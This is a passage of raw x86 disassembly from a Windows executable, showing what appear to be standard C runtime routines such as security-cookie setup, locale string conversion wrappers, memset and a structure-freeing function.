  425a19:	jne    0x425a55
  425a1b:	push   0x4
  425a1d:	call   0x423a6f
  425a22:	pop    ecx
  425a23:	and    DWORD PTR [ebp-0x4],0x0
  425a27:	mov    esi,DWORD PTR [ebp+0x8]
  425a2a:	push   esi
  425a2b:	call   0x424c92
  425a30:	pop    ecx
  425a31:	mov    DWORD PTR [ebp-0x1c],eax
  425a34:	test   eax,eax
  425a36:	je     0x425a43
  425a38:	mov    esi,DWORD PTR [esi-0x4]
  425a3b:	sub    esi,0x9
  425a3e:	mov    DWORD PTR [ebp-0x20],esi
  425a41:	jmp    0x425a46
  425a43:	mov    esi,DWORD PTR [ebp-0x20]
  425a46:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a4a:	call   0x425a73
  425a4f:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a53:	jne    0x425a68
  425a55:	push   DWORD PTR [ebp+0x8]
  425a58:	push   0x0
  425a5a:	push   DWORD PTR ds:0x45d140
  425a60:	call   DWORD PTR ds:0x4280b8
  425a66:	mov    esi,eax
  425a68:	mov    eax,esi
  425a6a:	call   0x4238e3
  425a6f:	ret    
  425a70:	mov    esi,DWORD PTR [ebp-0x20]
  425a73:	push   0x4
  425a75:	call   0x4239db
  425a7a:	pop    ecx
  425a7b:	ret    
  425a7c:	push   ebp
  425a7d:	mov    ebp,esp
  425a7f:	sub    esp,0x10
  425a82:	push   esi
  425a83:	lea    eax,[ebp-0x8]
  425a86:	push   eax
  425a87:	call   DWORD PTR ds:0x4280c8
  425a8d:	mov    esi,DWORD PTR [ebp-0x4]
  425a90:	xor    esi,DWORD PTR [ebp-0x8]
  425a93:	call   DWORD PTR ds:0x4280c4
  425a99:	xor    esi,eax
  425a9b:	call   DWORD PTR ds:0x428070
  425aa1:	xor    esi,eax
  425aa3:	call   DWORD PTR ds:0x4280c0
  425aa9:	xor    esi,eax
  425aab:	lea    eax,[ebp-0x10]
  425aae:	push   eax
  425aaf:	call   DWORD PTR ds:0x4280bc
  425ab5:	mov    eax,DWORD PTR [ebp-0xc]
  425ab8:	xor    eax,DWORD PTR [ebp-0x10]
  425abb:	xor    esi,eax
  425abd:	mov    DWORD PTR ds:0x45c430,esi
  425ac3:	jne    0x425acf
  425ac5:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425acf:	pop    esi
  425ad0:	leave  
  425ad1:	ret    
  425ad2:	push   0x118
  425ad7:	push   0x428930
  425adc:	call   0x4238a8
  425ae1:	mov    eax,ds:0x45c430
  425ae6:	xor    eax,DWORD PTR [ebp+0x4]
  425ae9:	mov    DWORD PTR [ebp-0x1c],eax
  425aec:	mov    eax,ds:0x45cd98
  425af1:	xor    ecx,ecx
  425af3:	cmp    eax,ecx
  425af5:	je     0x425b16
  425af7:	mov    DWORD PTR [ebp-0x4],ecx
  425afa:	push   DWORD PTR [ebp+0xc]
  425afd:	push   DWORD PTR [ebp+0x8]
  425b00:	call   eax
  425b02:	pop    ecx
  425b03:	pop    ecx
  425b04:	or     DWORD PTR [ebp-0x4],0xffffffff
  425b08:	jmp    0x425c14
  425b0d:	xor    eax,eax
  425b0f:	inc    eax
  425b10:	ret    
  425b11:	mov    esp,DWORD PTR [ebp-0x18]
  425b14:	jmp    0x425b04
  425b16:	mov    eax,DWORD PTR [ebp+0x8]
  425b19:	dec    eax
  425b1a:	je     0x425b2f
  425b1c:	mov    edi,0x42890c
  425b21:	mov    DWORD PTR [ebp-0x20],0x428858
  425b28:	mov    esi,0xd4
  425b2d:	jmp    0x425b40
  425b2f:	mov    edi,0x428838
  425b34:	mov    DWORD PTR [ebp-0x20],0x428798
  425b3b:	mov    esi,0xb9
  425b40:	mov    BYTE PTR [ebp-0x24],cl
  425b43:	push   0x104
  425b48:	lea    eax,[ebp-0x128]
  425b4e:	push   eax
  425b4f:	push   ecx
  425b50:	call   DWORD PTR ds:0x428040
  425b56:	test   eax,eax
  425b58:	jne    0x425b6d
  425b5a:	push   0x42848c
  425b5f:	lea    eax,[ebp-0x128]
  425b65:	push   eax
  425b66:	call   0x423c90
  425b6b:	pop    ecx
  425b6c:	pop    ecx
  425b6d:	lea    ebx,[ebp-0x128]
  425b73:	lea    eax,[ebp-0x128]
  425b79:	push   eax
  425b7a:	call   0x423ec0
  425b7f:	pop    ecx
  425b80:	add    eax,0xb
  425b83:	cmp    eax,0x3c
  425b86:	jbe    0x425bb1
  425b88:	lea    eax,[ebp-0x128]
  425b8e:	push   eax
  425b8f:	call   0x423ec0
  425b94:	mov    ebx,eax
  425b96:	lea    eax,[ebp-0x128]
  425b9c:	sub    eax,0x31
  425b9f:	add    ebx,eax
  425ba1:	push   0x3
  425ba3:	push   0x428488
  425ba8:	push   ebx
  425ba9:	call   0x423d90
  425bae:	add    esp,0x10
  425bb1:	push   ebx
  425bb2:	call   0x423ec0
  425bb7:	pop    ecx
  425bb8:	lea    eax,[eax+esi*1+0xc]
  425bbc:	add    eax,0x3
  425bbf:	and    eax,0xfffffffc
  425bc2:	call   0x423900
  425bc7:	mov    DWORD PTR [ebp-0x18],esp
  425bca:	mov    esi,esp
  425bcc:	push   edi
  425bcd:	push   esi
  425bce:	call   0x423c90
  425bd3:	mov    edi,0x428468
  425bd8:	push   edi
  425bd9:	push   esi
  425bda:	call   0x423ca0
  425bdf:	push   0x42878c
  425be4:	push   esi
  425be5:	call   0x423ca0
  425bea:	push   ebx
  425beb:	push   esi
  425bec:	call   0x423ca0
  425bf1:	push   edi
  425bf2:	push   esi
  425bf3:	call   0x423ca0
  425bf8:	push   DWORD PTR [ebp-0x20]
  425bfb:	push   esi
  425bfc:	call   0x423ca0
  425c01:	push   0x12010
  425c06:	push   0x428440
  425c0b:	push   esi
  425c0c:	call   0x423b92
  425c11:	add    esp,0x3c
  425c14:	push   0x3
  425c16:	call   0x422d16
  425c1b:	int3   
  425c1c:	push   0x38
  425c1e:	push   0x428d50
  425c23:	call   0x4238a8
  425c28:	xor    ebx,ebx
  425c2a:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425c30:	jne    0x425c6a
  425c32:	push   ebx
  425c33:	push   ebx
  425c34:	xor    esi,esi
  425c36:	inc    esi
  425c37:	push   esi
  425c38:	push   0x428d4c
  425c3d:	push   0x100
  425c42:	push   ebx
  425c43:	call   DWORD PTR ds:0x4280d4
  425c49:	test   eax,eax
  425c4b:	je     0x425c55
  425c4d:	mov    DWORD PTR ds:0x45cdbc,esi
  425c53:	jmp    0x425c6a
  425c55:	call   DWORD PTR ds:0x428014
  425c5b:	cmp    eax,0x78
  425c5e:	jne    0x425c6a
  425c60:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c6a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c6d:	jle    0x425c8a
  425c6f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c72:	mov    eax,DWORD PTR [ebp+0x10]
  425c75:	dec    ecx
  425c76:	cmp    BYTE PTR [eax],bl
  425c78:	je     0x425c82
  425c7a:	inc    eax
  425c7b:	cmp    ecx,ebx
  425c7d:	jne    0x425c75
  425c7f:	or     ecx,0xffffffff
  425c82:	or     eax,0xffffffff
  425c85:	sub    eax,ecx
  425c87:	add    DWORD PTR [ebp+0x14],eax
  425c8a:	mov    eax,ds:0x45cdbc
  425c8f:	cmp    eax,0x2
  425c92:	je     0x425e74
  425c98:	cmp    eax,ebx
  425c9a:	je     0x425e74
  425ca0:	cmp    eax,0x1
  425ca3:	jne    0x425ea7
  425ca9:	xor    edi,edi
  425cab:	mov    DWORD PTR [ebp-0x1c],edi
  425cae:	mov    DWORD PTR [ebp-0x20],ebx
  425cb1:	mov    DWORD PTR [ebp-0x24],ebx
  425cb4:	cmp    DWORD PTR [ebp+0x20],ebx
  425cb7:	jne    0x425cc1
  425cb9:	mov    eax,ds:0x45cdb4
  425cbe:	mov    DWORD PTR [ebp+0x20],eax
  425cc1:	push   ebx
  425cc2:	push   ebx
  425cc3:	push   DWORD PTR [ebp+0x14]
  425cc6:	push   DWORD PTR [ebp+0x10]
  425cc9:	xor    eax,eax
  425ccb:	cmp    DWORD PTR [ebp+0x24],ebx
  425cce:	setne  al
  425cd1:	lea    eax,[eax*8+0x1]
  425cd8:	push   eax
  425cd9:	push   DWORD PTR [ebp+0x20]
  425cdc:	call   DWORD PTR ds:0x4280d0
  425ce2:	mov    esi,eax
  425ce4:	mov    DWORD PTR [ebp-0x28],esi
  425ce7:	cmp    esi,ebx
  425ce9:	je     0x425ea7
  425cef:	mov    DWORD PTR [ebp-0x4],0x1
  425cf6:	lea    eax,[esi+esi*1]
  425cf9:	add    eax,0x3
  425cfc:	and    eax,0xfffffffc
  425cff:	call   0x423900
  425d04:	mov    DWORD PTR [ebp-0x18],esp
  425d07:	mov    eax,esp
  425d09:	mov    DWORD PTR [ebp-0x2c],eax
  425d0c:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d10:	jmp    0x425d2d
  425d12:	xor    eax,eax
  425d14:	inc    eax
  425d15:	ret    
  425d16:	mov    esp,DWORD PTR [ebp-0x18]
  425d19:	call   0x426d45
  425d1e:	xor    ebx,ebx
  425d20:	mov    DWORD PTR [ebp-0x2c],ebx
  425d23:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d27:	mov    edi,DWORD PTR [ebp-0x1c]
  425d2a:	mov    esi,DWORD PTR [ebp-0x28]
  425d2d:	cmp    DWORD PTR [ebp-0x2c],ebx
  425d30:	jne    0x425d4e
  425d32:	lea    eax,[esi+esi*1]
  425d35:	push   eax
  425d36:	call   0x4245d2
  425d3b:	pop    ecx
  425d3c:	mov    DWORD PTR [ebp-0x2c],eax
  425d3f:	cmp    eax,ebx
  425d41:	je     0x425ea7
  425d47:	mov    DWORD PTR [ebp-0x20],0x1
  425d4e:	push   esi
  425d4f:	push   DWORD PTR [ebp-0x2c]
  425d52:	push   DWORD PTR [ebp+0x14]
  425d55:	push   DWORD PTR [ebp+0x10]
  425d58:	push   0x1
  425d5a:	push   DWORD PTR [ebp+0x20]
  425d5d:	call   DWORD PTR ds:0x4280d0
  425d63:	test   eax,eax
  425d65:	je     0x425e51
  425d6b:	push   ebx
  425d6c:	push   ebx
  425d6d:	push   esi
  425d6e:	push   DWORD PTR [ebp-0x2c]
  425d71:	push   DWORD PTR [ebp+0xc]
  425d74:	push   DWORD PTR [ebp+0x8]
  425d77:	call   DWORD PTR ds:0x4280d4
  425d7d:	mov    edi,eax
  425d7f:	mov    DWORD PTR [ebp-0x1c],edi
  425d82:	cmp    edi,ebx
  425d84:	je     0x425e51
  425d8a:	test   BYTE PTR [ebp+0xd],0x4
  425d8e:	je     0x425dbd
  425d90:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d93:	je     0x425e51
  425d99:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d9c:	jg     0x425e51
  425da2:	push   DWORD PTR [ebp+0x1c]
  425da5:	push   DWORD PTR [ebp+0x18]
  425da8:	push   esi
  425da9:	push   DWORD PTR [ebp-0x2c]
  425dac:	push   DWORD PTR [ebp+0xc]
  425daf:	push   DWORD PTR [ebp+0x8]
  425db2:	call   DWORD PTR ds:0x4280d4
  425db8:	jmp    0x425e51
  425dbd:	mov    DWORD PTR [ebp-0x4],0x2
  425dc4:	lea    eax,[edi+edi*1]
  425dc7:	add    eax,0x3
  425dca:	and    eax,0xfffffffc
  425dcd:	call   0x423900
  425dd2:	mov    DWORD PTR [ebp-0x18],esp
  425dd5:	mov    eax,esp
  425dd7:	mov    DWORD PTR [ebp-0x30],eax
  425dda:	or     DWORD PTR [ebp-0x4],0xffffffff
  425dde:	jmp    0x425dfb
  425de0:	xor    eax,eax
  425de2:	inc    eax
  425de3:	ret    
  425de4:	mov    esp,DWORD PTR [ebp-0x18]
  425de7:	call   0x426d45
  425dec:	xor    ebx,ebx
  425dee:	mov    DWORD PTR [ebp-0x30],ebx
  425df1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425df5:	mov    edi,DWORD PTR [ebp-0x1c]
  425df8:	mov    esi,DWORD PTR [ebp-0x28]
  425dfb:	cmp    DWORD PTR [ebp-0x30],ebx
  425dfe:	jne    0x425e18
  425e00:	lea    eax,[edi+edi*1]
  425e03:	push   eax
  425e04:	call   0x4245d2
  425e09:	pop    ecx
  425e0a:	mov    DWORD PTR [ebp-0x30],eax
  425e0d:	cmp    eax,ebx
  425e0f:	je     0x425e51
  425e11:	mov    DWORD PTR [ebp-0x24],0x1
  425e18:	push   edi
  425e19:	push   DWORD PTR [ebp-0x30]
  425e1c:	push   esi
  425e1d:	push   DWORD PTR [ebp-0x2c]
  425e20:	push   DWORD PTR [ebp+0xc]
  425e23:	push   DWORD PTR [ebp+0x8]
  425e26:	call   DWORD PTR ds:0x4280d4
  425e2c:	test   eax,eax
  425e2e:	je     0x425e51
  425e30:	push   ebx
  425e31:	push   ebx
  425e32:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e35:	jne    0x425e3b
  425e37:	push   ebx
  425e38:	push   ebx
  425e39:	jmp    0x425e41
  425e3b:	push   DWORD PTR [ebp+0x1c]
  425e3e:	push   DWORD PTR [ebp+0x18]
  425e41:	push   edi
  425e42:	push   DWORD PTR [ebp-0x30]
  425e45:	push   ebx
  425e46:	push   DWORD PTR [ebp+0x20]
  425e49:	call   DWORD PTR ds:0x428054
  425e4f:	mov    edi,eax
  425e51:	cmp    DWORD PTR [ebp-0x24],ebx
  425e54:	je     0x425e5f
  425e56:	push   DWORD PTR [ebp-0x30]
  425e59:	call   0x4244ba
  425e5e:	pop    ecx
  425e5f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e62:	je     0x425e6d
  425e64:	push   DWORD PTR [ebp-0x2c]
  425e67:	call   0x4244ba
  425e6c:	pop    ecx
  425e6d:	mov    eax,edi
  425e6f:	jmp    0x425fcf
  425e74:	mov    DWORD PTR [ebp-0x34],ebx
  425e77:	xor    edi,edi
  425e79:	mov    DWORD PTR [ebp-0x38],ebx
  425e7c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e7f:	jne    0x425e89
  425e81:	mov    eax,ds:0x45cda4
  425e86:	mov    DWORD PTR [ebp+0x8],eax
  425e89:	cmp    DWORD PTR [ebp+0x20],ebx
  425e8c:	jne    0x425e96
  425e8e:	mov    eax,ds:0x45cdb4
  425e93:	mov    DWORD PTR [ebp+0x20],eax
  425e96:	push   DWORD PTR [ebp+0x8]
  425e99:	call   0x426b2d
  425e9e:	pop    ecx
  425e9f:	mov    DWORD PTR [ebp-0x3c],eax
  425ea2:	cmp    eax,0xffffffff
  425ea5:	jne    0x425eae
  425ea7:	xor    eax,eax
  425ea9:	jmp    0x425fcf
  425eae:	cmp    eax,DWORD PTR [ebp+0x20]
  425eb1:	je     0x425fa5
  425eb7:	push   ebx
  425eb8:	push   ebx
  425eb9:	lea    ecx,[ebp+0x14]
  425ebc:	push   ecx
  425ebd:	push   DWORD PTR [ebp+0x10]
  425ec0:	push   eax
  425ec1:	push   DWORD PTR [ebp+0x20]
  425ec4:	call   0x426b76
  425ec9:	add    esp,0x18
  425ecc:	mov    DWORD PTR [ebp-0x34],eax
  425ecf:	cmp    eax,ebx
  425ed1:	je     0x425ea7
  425ed3:	push   ebx
  425ed4:	push   ebx
  425ed5:	push   DWORD PTR [ebp+0x14]
  425ed8:	push   eax
  425ed9:	push   DWORD PTR [ebp+0xc]
  425edc:	push   DWORD PTR [ebp+0x8]
  425edf:	call   DWORD PTR ds:0x4280cc
  425ee5:	mov    esi,eax
  425ee7:	mov    DWORD PTR [ebp-0x40],esi
  425eea:	cmp    esi,ebx
  425eec:	je     0x425f94
  425ef2:	mov    DWORD PTR [ebp-0x4],ebx
  425ef5:	add    eax,0x3
  425ef8:	and    eax,0xfffffffc
  425efb:	call   0x423900
  425f00:	mov    DWORD PTR [ebp-0x18],esp
  425f03:	mov    edi,esp
  425f05:	mov    DWORD PTR [ebp-0x44],edi
  425f08:	push   esi
  425f09:	push   ebx
  425f0a:	push   edi
  425f0b:	call   0x4261b0
  425f10:	add    esp,0xc
  425f13:	jmp    0x425f25
  425f15:	xor    eax,eax
  425f17:	inc    eax
  425f18:	ret    
  425f19:	mov    esp,DWORD PTR [ebp-0x18]
  425f1c:	call   0x426d45
  425f21:	xor    ebx,ebx
  425f23:	xor    edi,edi
  425f25:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f29:	cmp    edi,ebx
  425f2b:	jne    0x425f50
  425f2d:	push   DWORD PTR [ebp-0x40]
  425f30:	call   0x4245d2
  425f35:	pop    ecx
  425f36:	mov    edi,eax
  425f38:	cmp    edi,ebx
  425f3a:	je     0x425f6d
  425f3c:	push   DWORD PTR [ebp-0x40]
  425f3f:	push   ebx
  425f40:	push   edi
  425f41:	call   0x4261b0
  425f46:	add    esp,0xc
  425f49:	mov    DWORD PTR [ebp-0x38],0x1
  425f50:	push   DWORD PTR [ebp-0x40]
  425f53:	push   edi
  425f54:	push   DWORD PTR [ebp+0x14]
  425f57:	push   DWORD PTR [ebp-0x34]
  425f5a:	push   DWORD PTR [ebp+0xc]
  425f5d:	push   DWORD PTR [ebp+0x8]
  425f60:	call   DWORD PTR ds:0x4280cc
  425f66:	mov    DWORD PTR [ebp-0x40],eax
  425f69:	cmp    eax,ebx
  425f6b:	jne    0x425f71
  425f6d:	xor    esi,esi
  425f6f:	jmp    0x425f97
  425f71:	push   DWORD PTR [ebp+0x1c]
  425f74:	push   DWORD PTR [ebp+0x18]
  425f77:	lea    eax,[ebp-0x40]
  425f7a:	push   eax
  425f7b:	push   edi
  425f7c:	push   DWORD PTR [ebp+0x20]
  425f7f:	push   DWORD PTR [ebp-0x3c]
  425f82:	call   0x426b76
  425f87:	add    esp,0x18
  425f8a:	mov    esi,eax
  425f8c:	neg    esi
  425f8e:	sbb    esi,esi
  425f90:	neg    esi
  425f92:	jmp    0x425f97
  425f94:	mov    esi,DWORD PTR [ebp-0x48]
  425f97:	cmp    DWORD PTR [ebp-0x38],ebx
  425f9a:	je     0x425fbf
  425f9c:	push   edi
  425f9d:	call   0x4244ba
  425fa2:	pop    ecx
  425fa3:	jmp    0x425fbf
  425fa5:	push   DWORD PTR [ebp+0x1c]
  425fa8:	push   DWORD PTR [ebp+0x18]
  425fab:	push   DWORD PTR [ebp+0x14]
  425fae:	push   DWORD PTR [ebp+0x10]
  425fb1:	push   DWORD PTR [ebp+0xc]
  425fb4:	push   DWORD PTR [ebp+0x8]
  425fb7:	call   DWORD PTR ds:0x4280cc
  425fbd:	mov    esi,eax
  425fbf:	cmp    DWORD PTR [ebp-0x34],ebx
  425fc2:	je     0x425fcd
  425fc4:	push   DWORD PTR [ebp-0x34]
  425fc7:	call   0x4244ba
  425fcc:	pop    ecx
  425fcd:	mov    eax,esi
  425fcf:	lea    esp,[ebp-0x54]
  425fd2:	call   0x4238e3
  425fd7:	ret    
  425fd8:	push   0x1c
  425fda:	push   0x428d78
  425fdf:	call   0x4238a8
  425fe4:	xor    esi,esi
  425fe6:	cmp    DWORD PTR ds:0x45cdc0,esi
  425fec:	jne    0x426023
  425fee:	lea    eax,[ebp-0x1c]
  425ff1:	push   eax
  425ff2:	xor    edi,edi
  425ff4:	inc    edi
  425ff5:	push   edi
  425ff6:	push   0x428d4c
  425ffb:	push   edi
  425ffc:	call   DWORD PTR ds:0x4280dc
  426002:	test   eax,eax
  426004:	je     0x42600e
  426006:	mov    DWORD PTR ds:0x45cdc0,edi
  42600c:	jmp    0x426023
  42600e:	call   DWORD PTR ds:0x428014
  426014:	cmp    eax,0x78
  426017:	jne    0x426023
  426019:	mov    DWORD PTR ds:0x45cdc0,0x2
  426023:	mov    eax,ds:0x45cdc0
  426028:	cmp    eax,0x2
  42602b:	je     0x42611b
  426031:	cmp    eax,esi
  426033:	je     0x42611b
  426039:	cmp    eax,0x1
  42603c:	jne    0x426141
  426042:	mov    DWORD PTR [ebp-0x20],esi
  426045:	mov    DWORD PTR [ebp-0x24],esi
  426048:	cmp    DWORD PTR [ebp+0x18],esi
  42604b:	jne    0x426055
  42604d:	mov    eax,ds:0x45cdb4
  426052:	mov    DWORD PTR [ebp+0x18],eax
  426055:	push   esi
  426056:	push   esi
  426057:	push   DWORD PTR [ebp+0x10]
  42605a:	push   DWORD PTR [ebp+0xc]
  42605d:	xor    eax,eax
  42605f:	cmp    DWORD PTR [ebp+0x20],esi
  426062:	setne  al
  426065:	lea    eax,[eax*8+0x1]
  42606c:	push   eax
  42606d:	push   DWORD PTR [ebp+0x18]
  426070:	call   DWORD PTR ds:0x4280d0
  426076:	mov    edi,eax
  426078:	mov    DWORD PTR [ebp-0x28],edi
  42607b:	test   edi,edi
  42607d:	je     0x426141
  426083:	and    DWORD PTR [ebp-0x4],0x0
  426087:	lea    ebx,[edi+edi*1]
  42608a:	mov    eax,ebx
  42608c:	add    eax,0x3
  42608f:	and    eax,0xfffffffc
  426092:	call   0x423900
  426097:	mov    DWORD PTR [ebp-0x18],esp
  42609a:	mov    esi,esp
  42609c:	mov    DWORD PTR [ebp-0x2c],esi
  42609f:	push   ebx
  4260a0:	push   0x0
  4260a2:	push   esi
  4260a3:	call   0x4261b0
  4260a8:	add    esp,0xc
  4260ab:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260af:	jmp    0x4260c6
  4260b1:	xor    eax,eax
  4260b3:	inc    eax
  4260b4:	ret    
  4260b5:	mov    esp,DWORD PTR [ebp-0x18]
  4260b8:	call   0x426d45
  4260bd:	xor    esi,esi
  4260bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260c3:	mov    edi,DWORD PTR [ebp-0x28]
  4260c6:	test   esi,esi
  4260c8:	jne    0x4260e1
  4260ca:	push   edi
  4260cb:	push   0x2
  4260cd:	call   0x4249c8
  4260d2:	pop    ecx
  4260d3:	pop    ecx
  4260d4:	mov    esi,eax
  4260d6:	test   esi,esi
  4260d8:	je     0x426141
  4260da:	mov    DWORD PTR [ebp-0x24],0x1
  4260e1:	push   edi
  4260e2:	push   esi
  4260e3:	push   DWORD PTR [ebp+0x10]
  4260e6:	push   DWORD PTR [ebp+0xc]
  4260e9:	push   0x1
  4260eb:	push   DWORD PTR [ebp+0x18]
  4260ee:	call   DWORD PTR ds:0x4280d0
  4260f4:	test   eax,eax
  4260f6:	je     0x426109
  4260f8:	push   DWORD PTR [ebp+0x14]
  4260fb:	push   eax
  4260fc:	push   esi
  4260fd:	push   DWORD PTR [ebp+0x8]
  426100:	call   DWORD PTR ds:0x4280dc
  426106:	mov    DWORD PTR [ebp-0x20],eax
  426109:	cmp    DWORD PTR [ebp-0x24],0x0
  42610d:	je     0x426116
  42610f:	push   esi
  426110:	call   0x4244ba
  426115:	pop    ecx
  426116:	mov    eax,DWORD PTR [ebp-0x20]
  426119:	jmp    0x426189
  42611b:	mov    ebx,DWORD PTR [ebp+0x1c]
  42611e:	cmp    ebx,esi
  426120:	jne    0x426128
  426122:	mov    ebx,DWORD PTR ds:0x45cda4
  426128:	mov    edi,DWORD PTR [ebp+0x18]
  42612b:	test   edi,edi
  42612d:	jne    0x426135
  42612f:	mov    edi,DWORD PTR ds:0x45cdb4
  426135:	push   ebx
  426136:	call   0x426b2d
  42613b:	pop    ecx
  42613c:	cmp    eax,0xffffffff
  42613f:	jne    0x426145
  426141:	xor    eax,eax
  426143:	jmp    0x426189
  426145:	cmp    eax,edi
  426147:	je     0x426167
  426149:	push   0x0
  42614b:	push   0x0
  42614d:	lea    ecx,[ebp+0x10]
  426150:	push   ecx
  426151:	push   DWORD PTR [ebp+0xc]
  426154:	push   eax
  426155:	push   edi
  426156:	call   0x426b76
  42615b:	add    esp,0x18
  42615e:	mov    esi,eax
  426160:	test   esi,esi
  426162:	je     0x426141
  426164:	mov    DWORD PTR [ebp+0xc],esi
  426167:	push   DWORD PTR [ebp+0x14]
  42616a:	push   DWORD PTR [ebp+0x10]
  42616d:	push   DWORD PTR [ebp+0xc]
  426170:	push   DWORD PTR [ebp+0x8]
  426173:	push   ebx
  426174:	call   DWORD PTR ds:0x4280d8
  42617a:	mov    edi,eax
  42617c:	test   esi,esi
  42617e:	je     0x426187
  426180:	push   esi
  426181:	call   0x4244ba
  426186:	pop    ecx
  426187:	mov    eax,edi
  426189:	lea    esp,[ebp-0x38]
  42618c:	call   0x4238e3
  426191:	ret    
  426192:	mov    eax,ds:0x45cdc4
  426197:	test   eax,eax
  426199:	je     0x4261aa
  42619b:	push   DWORD PTR [esp+0x4]
  42619f:	call   eax
  4261a1:	test   eax,eax
  4261a3:	pop    ecx
  4261a4:	je     0x4261aa
  4261a6:	xor    eax,eax
  4261a8:	inc    eax
  4261a9:	ret    
  4261aa:	xor    eax,eax
  4261ac:	ret    
  4261ad:	int3   
  4261ae:	int3   
  4261af:	int3   
  4261b0:	mov    edx,DWORD PTR [esp+0xc]
  4261b4:	mov    ecx,DWORD PTR [esp+0x4]
  4261b8:	test   edx,edx
  4261ba:	je     0x42620b
  4261bc:	xor    eax,eax
  4261be:	mov    al,BYTE PTR [esp+0x8]
  4261c2:	push   edi
  4261c3:	mov    edi,ecx
  4261c5:	cmp    edx,0x4
  4261c8:	jb     0x4261fb
  4261ca:	neg    ecx
  4261cc:	and    ecx,0x3
  4261cf:	je     0x4261dd
  4261d1:	sub    edx,ecx
  4261d3:	mov    BYTE PTR [edi],al
  4261d5:	add    edi,0x1
  4261d8:	sub    ecx,0x1
  4261db:	jne    0x4261d3
  4261dd:	mov    ecx,eax
  4261df:	shl    eax,0x8
  4261e2:	add    eax,ecx
  4261e4:	mov    ecx,eax
  4261e6:	shl    eax,0x10
  4261e9:	add    eax,ecx
  4261eb:	mov    ecx,edx
  4261ed:	and    edx,0x3
  4261f0:	shr    ecx,0x2
  4261f3:	je     0x4261fb
  4261f5:	rep stos DWORD PTR es:[edi],eax
  4261f7:	test   edx,edx
  4261f9:	je     0x426205
  4261fb:	mov    BYTE PTR [edi],al
  4261fd:	add    edi,0x1
  426200:	sub    edx,0x1
  426203:	jne    0x4261fb
  426205:	mov    eax,DWORD PTR [esp+0x8]
  426209:	pop    edi
  42620a:	ret    
  42620b:	mov    eax,DWORD PTR [esp+0x4]
  42620f:	ret    
  426210:	push   esi
  426211:	mov    esi,DWORD PTR [esp+0x8]
  426215:	test   esi,esi
  426217:	je     0x42639e
  42621d:	push   DWORD PTR [esi+0x4]
  426220:	call   0x4244ba
  426225:	push   DWORD PTR [esi+0x8]
  426228:	call   0x4244ba
  42622d:	push   DWORD PTR [esi+0xc]
  426230:	call   0x4244ba
  426235:	push   DWORD PTR [esi+0x10]
  426238:	call   0x4244ba
  42623d:	push   DWORD PTR [esi+0x14]
  426240:	call   0x4244ba
  426245:	push   DWORD PTR [esi+0x18]
  426248:	call   0x4244ba
  42624d:	push   DWORD PTR [esi]
  42624f:	call   0x4244ba
  426254:	push   DWORD PTR [esi+0x20]
  426257:	call   0x4244ba
  42625c:	push   DWORD PTR [esi+0x24]
  42625f:	call   0x4244ba
  426264:	push   DWORD PTR [esi+0x28]
  426267:	call   0x4244ba
  42626c:	push   DWORD PTR [esi+0x2c]
  42626f:	call   0x4244ba
  426274:	push   DWORD PTR [esi+0x30]
  426277:	call   0x4244ba
  42627c:	push   DWORD PTR [esi+0x34]
  42627f:	call   0x4244ba
  426284:	push   DWORD PTR [esi+0x1c]
  426287:	call   0x4244ba
  42628c:	push   DWORD PTR [esi+0x38]
  42628f:	call   0x4244ba
  426294:	push   DWORD PTR [esi+0x3c]
  426297:	call   0x4244ba
  42629c:	add    esp,0x40
  42629f:	push   DWORD PTR [esi+0x40]
  4262a2:	call   0x4244ba
  4262a7:	push   DWORD PTR [esi+0x44]
  4262aa:	call   0x4244ba
  4262af:	push   DWORD PTR [esi+0x48]
  4262b2:	call   0x4244ba
  4262b7:	push   DWORD PTR [esi+0x4c]
  4262ba:	call   0x4244ba
  4262bf:	push   DWORD PTR [esi+0x50]
  4262c2:	call   0x4244ba
  4262c7:	push   DWORD PTR [esi+0x54]
  4262ca:	call   0x4244ba
  4262cf:	push   DWORD PTR [esi+0x58]
  4262d2:	call   0x4244ba
  4262d7:	push   DWORD PTR [esi+0x5c]
  4262da:	call   0x4244ba
  4262df:	push   DWORD PTR [esi+0x60]
  4262e2:	call   0x4244ba
  4262e7:	push   DWORD PTR [esi+0x64]
  4262ea:	call   0x4244ba
  4262ef:	push   DWORD PTR [esi+0x68]
  4262f2:	call   0x4244ba
  4262f7:	push   DWORD PTR [esi+0x6c]
  4262fa:	call   0x4244ba
  4262ff:	push   DWORD PTR [esi+0x70]
  426302:	call   0x4244ba
  426307:	push   DWORD PTR [esi+0x74]
  42630a:	call   0x4244ba
  42630f:	push   DWORD PTR [esi+0x78]
  426312:	call   0x4244ba
  426317:	push   DWORD PTR [esi+0x7c]
  42631a:	call   0x4244ba
  42631f:	add    esp,0x40
  426322:	push   DWORD PTR [esi+0x80]
  426328:	call   0x4244ba
  42632d:	push   DWORD PTR [esi+0x84]
  426333:	call   0x4244ba
  426338:	push   DWORD PTR [esi+0x88]
  42633e:	call   0x4244ba
  426343:	push   DWORD PTR [esi+0x8c]
  426349:	call   0x4244ba
  42634e:	push   DWORD PTR [esi+0x90]
  426354:	call   0x4244ba
  426359:	push   DWORD PTR [esi+0x94]
  42635f:	call   0x4244ba
  426364:	push   DWORD PTR [esi+0x98]
  42636a:	call   0x4244ba
  42636f:	push   DWORD PTR [esi+0x9c]
  426375:	call   0x4244ba
  42637a:	push   DWORD PTR [esi+0xa0]
  426380:	call   0x4244ba
  426385:	push   DWORD PTR [esi+0xa4]
  42638b:	call   0x4244ba
  426390:	push   DWORD PTR [esi+0xa8]
  426396:	call   0x4244ba
  42639b:	add    esp,0x2c
  42639e:	pop    esi
  42639f:	ret    
  4263a0:	push   esi
  4263a1:	mov    esi,DWORD PTR [esp+0x8]
